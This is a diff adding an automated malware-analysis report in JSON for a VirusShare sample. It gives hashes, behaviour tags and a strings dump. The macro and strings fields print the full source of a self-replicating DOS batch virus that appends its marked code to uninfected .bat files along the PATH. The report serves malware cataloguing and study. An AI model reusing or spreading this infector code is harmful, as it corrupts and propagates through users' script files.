@@ -1,0 +1,80 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "autoexec": "Runs when the Word document is opened",
+            "call": "May call a DLL using Excel 4 Macros",
+            "command": "May run PowerShell commands"
+        },
+        "macro": "if '%1=='RBM goto RBM%2\nset RBM=%0.bat\nif not exist %RBM% set RBM=%0\nif '%RBM%==' set RBM=autoexec.bat\nif exist c:\\_RBM.bat goto RBMg\nif exist %RBM% goto RBMf\ncall %RBM% RBM h %path%\nif exist %RBM% goto RBMf\ngoto eRBM\n:RBMh\nshift%_RBM%\nif '%2==' goto RBMx\nif exist %2\\%RBM set RBM=%2\\%RBM%\nif exist %2%RBM set RBM=%2%RBM%\nif exist %2\\%RBM.bat set RBM=%2\\%RBM%.bat\nif exist %2%RBM.bat set RBM=%2%RBM%.bat\nif not exist %RBM% goto RBMh\ngoto RBMx\n:RBMf\nfind \"RBM\"<%RBM%>c:\\_RBM.bat\n:RBMg\nif '%!RBM%=='- goto RBMe\nset !RBM=%!RBM%-\ncommand /e:5000 /c c:\\_RBM RBM v . .. %path%\n:eRBM\nset RBM=\nif exist \\!RBM.bat del \\!RBM.bat\ngoto RBMe\n:RBMx\necho.>\\!RBM.bat\n\\!RBM.bat\n:RBMv\nshift%_RBM%\nif '%2==' exit RBM\nfor %%a in (%2\\*.bat %2*.bat) do call c:\\_RBM RBM i %%a \ngoto RBMv\n:RBMi\nfind \"RBM\"<%3>nul\nif not errorlevel 1 goto RBMe\ntype c:\\_RBM.bat>RBM$\ntype %3>>RBM$\nmove RBM$ %3>nul\nset RBM#=%RBM#%-\nif %RBM#%==----- exit \n:RBMe"
+    },
+    "filename": "VirusShare_1a7127425e08afb2c21dd686553298d3",
+    "filesize": 963,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "1a7127425e08afb2c21dd686553298d3",
+        "sha1": "c2471232c461b231e8cd9d390a73cde0dd26f349",
+        "sha256": "658b0f5bb1a9aeb0e20c1a62de4525b2b96aed61c70cf4a69b9afe0f455b020b"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "if '%1=='RBM goto RBM%2",
+            "set RBM=%0.bat",
+            "if not exist %RBM% set RBM=%0",
+            "if '%RBM%==' set RBM=autoexec.bat",
+            "if exist c:\\_RBM.bat goto RBMg",
+            "if exist %RBM% goto RBMf",
+            "call %RBM% RBM h %path%",
+            "if exist %RBM% goto RBMf",
+            "goto eRBM",
+            ":RBMh",
+            "shift%_RBM%",
+            "if '%2==' goto RBMx",
+            "if exist %2\\%RBM set RBM=%2\\%RBM%",
+            "if exist %2%RBM set RBM=%2%RBM%",
+            "if exist %2\\%RBM.bat set RBM=%2\\%RBM%.bat",
+            "if exist %2%RBM.bat set RBM=%2%RBM%.bat",
+            "if not exist %RBM% goto RBMh",
+            "goto RBMx",
+            ":RBMf",
+            "find \"RBM\"<%RBM%>c:\\_RBM.bat",
+            ":RBMg",
+            "if '%!RBM%=='- goto RBMe",
+            "set !RBM=%!RBM%-",
+            "command /e:5000 /c c:\\_RBM RBM v . .. %path%",
+            ":eRBM",
+            "set RBM=",
+            "if exist \\!RBM.bat del \\!RBM.bat",
+            "goto RBMe",
+            ":RBMx",
+            "echo.>\\!RBM.bat",
+            "\\!RBM.bat",
+            ":RBMv",
+            "shift%_RBM%",
+            "if '%2==' exit RBM",
+            "for %%a in (%2\\*.bat %2*.bat) do call c:\\_RBM RBM i %%a ",
+            "goto RBMv",
+            ":RBMi",
+            "find \"RBM\"<%3>nul",
+            "if not errorlevel 1 goto RBMe",
+            "type c:\\_RBM.bat>RBM$",
+            "type %3>>RBM$",
+            "move RBM$ %3>nul",
+            "set RBM#=%RBM#%-",
+            "if %RBM#%==----- exit ",
+            ":RBMe"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.302217",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
